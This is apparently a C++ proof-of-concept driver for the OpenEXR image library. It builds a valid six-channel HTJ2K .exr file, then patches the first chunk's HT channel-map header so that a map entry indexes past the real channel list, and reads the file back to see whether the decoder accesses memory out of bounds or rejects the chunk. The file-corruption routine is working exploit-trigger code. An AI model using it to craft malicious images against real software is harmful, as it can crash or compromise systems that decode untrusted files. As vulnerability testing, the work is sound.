/*
 * PoC driver: reads a crafted HTJ2K scanline .exr through the public
 * OpenEXR reader API (Imf::InputFile).  The file's per-chunk HT channel
 * map declares more codestream channels than the file actually has, with
 * a map entry whose file_index exceeds the real channel count.  A correct
 * decoder rejects the chunk; a decoder that trusts the map indexes the
 * per-channel info array out of bounds.
 *
 * The program first writes a valid HTJ2K file with 6 half channels, then
 * rewrites the first chunk's HT channel-map header in place, then reads
 * the image back.  On a sound library the corrupt chunk is reported as an
 * error (caught below) and the program exits normally; on a faulty one it
 * crashes inside the decoder.
 */

#include <OpenEXR/ImfInputFile.h>
#include <OpenEXR/ImfOutputFile.h>
#include <OpenEXR/ImfFrameBuffer.h>
#include <OpenEXR/ImfChannelList.h>
#include <OpenEXR/ImfHeader.h>
#include <Imath/half.h>

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <vector>

using namespace OPENEXR_IMF_NAMESPACE;
using namespace IMATH_NAMESPACE;

#define IMG_W 128
#define IMG_H 128
#define NCH   6

static const char* CHNAMES[NCH] = { "A", "B", "C", "D", "E", "F" };

static void
write_source_file (const char* path)
{
    Header hdr (IMG_W, IMG_H);
    hdr.compression () = HTJ2K256_COMPRESSION;
    for (int c = 0; c < NCH; c++)
        hdr.channels ().insert (CHNAMES[c], Channel (HALF));

    /* smooth sample data: compressible enough that the HTJ2K codec emits a
     * real codestream (rather than the uncompressed fallback), but with a
     * comfortably non-trivial codestream length */
    std::vector<half> buf ((size_t) NCH * IMG_W * IMG_H);
    for (int y = 0; y < IMG_H; y++)
        for (int x = 0; x < IMG_W; x++)
            for (int c = 0; c < NCH; c++)
                buf[(size_t) c * IMG_W * IMG_H + (size_t) y * IMG_W + x] =
                    half ((float) ((x * 3 + y * 5 + c * 7) % 509) * 0.125f);

    FrameBuffer fb;
    for (int c = 0; c < NCH; c++)
    {
        half* base = buf.data () + (size_t) c * IMG_W * IMG_H;
        fb.insert (CHNAMES[c],
                   Slice (HALF, (char*) base, sizeof (half), sizeof (half) * IMG_W));
    }

    OutputFile out (path, hdr);
    out.setFrameBuffer (fb);
    out.writePixels (IMG_H);
}

int
main (void)
{
    const char* path = "probe_htj2k.exr";

    write_source_file (path);

    /* slurp the file back in */
    FILE* f = fopen (path, "rb");
    if (!f) return 1;
    fseek (f, 0, SEEK_END);
    long sz = ftell (f);
    fseek (f, 0, SEEK_SET);
    std::vector<unsigned char> data ((size_t) sz);
    if (fread (data.data (), 1, (size_t) sz, f) != (size_t) sz) { fclose (f); return 1; }
    fclose (f);

    /* HT channel-map header for a 6-channel chunk:
     *   magic 'HT' (be16) | payload size 14 (be32) | channel count 6 (be16) */
    const unsigned char sig[8] = { 0x48, 0x54, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x06 };
    long ht = -1;
    for (long i = 8; i + 8 <= sz; i++)
    {
        if (memcmp (data.data () + i, sig, 8) != 0) continue;
        /* first scanline chunk has y coordinate 0 (data window starts at 0) */
        uint32_t yc = (uint32_t) data[i - 8] | ((uint32_t) data[i - 7] << 8) |
                      ((uint32_t) data[i - 6] << 16) | ((uint32_t) data[i - 5] << 24);
        uint32_t packed = (uint32_t) data[i - 4] | ((uint32_t) data[i - 3] << 8) |
                          ((uint32_t) data[i - 2] << 16) | ((uint32_t) data[i - 1] << 24);
        if (yc == 0 && packed >= 20 && (long) (i + packed) <= sz) { ht = i; break; }
    }
    if (ht < 0) return 1;

    uint32_t packed = (uint32_t) data[ht - 4] | ((uint32_t) data[ht - 3] << 8) |
                      ((uint32_t) data[ht - 2] << 16) | ((uint32_t) data[ht - 1] << 24);

    /* grow the map so its first entry points past the real channel list,
     * keeping the header inside the existing chunk payload */
    uint32_t maxn = (packed - 8) / 2;         /* header = 8 + 2*count <= packed */
    uint32_t nnew = maxn > 32 ? 32 : maxn;
    if (nnew < 8) return 1;                    /* need file_index = nnew-1 >= 7 */
    uint32_t payload = 2 + 2 * nnew;

    data[ht + 0] = 0x48;
    data[ht + 1] = 0x54;
    data[ht + 2] = (payload >> 24) & 0xFF;
    data[ht + 3] = (payload >> 16) & 0xFF;
    data[ht + 4] = (payload >> 8) & 0xFF;
    data[ht + 5] = payload & 0xFF;
    data[ht + 6] = (nnew >> 8) & 0xFF;
    data[ht + 7] = nnew & 0xFF;
    for (uint32_t k = 0; k < nnew; k++)
    {
        uint16_t fi = (k == 0) ? (uint16_t) (nnew - 1) : (uint16_t) (k - 1);
        data[ht + 8 + 2 * k]     = (fi >> 8) & 0xFF;
        data[ht + 8 + 2 * k + 1] = fi & 0xFF;
    }

    f = fopen (path, "wb");
    if (!f) return 1;
    fwrite (data.data (), 1, (size_t) sz, f);
    fclose (f);

    /* read the image back through the public reader */
    try
    {
        InputFile in (path);
        FrameBuffer fb;
        std::vector<half> rbuf ((size_t) NCH * IMG_W * IMG_H);
        for (int c = 0; c < NCH; c++)
        {
            half* base = rbuf.data () + (size_t) c * IMG_W * IMG_H;
            fb.insert (CHNAMES[c],
                       Slice (HALF, (char*) base, sizeof (half), sizeof (half) * IMG_W));
        }
        in.setFrameBuffer (fb);
        in.readPixels (0, IMG_H - 1);
    }
    catch (...)
    {
        /* corrupt chunk cleanly rejected */
        return 0;
    }

    return 0;
}
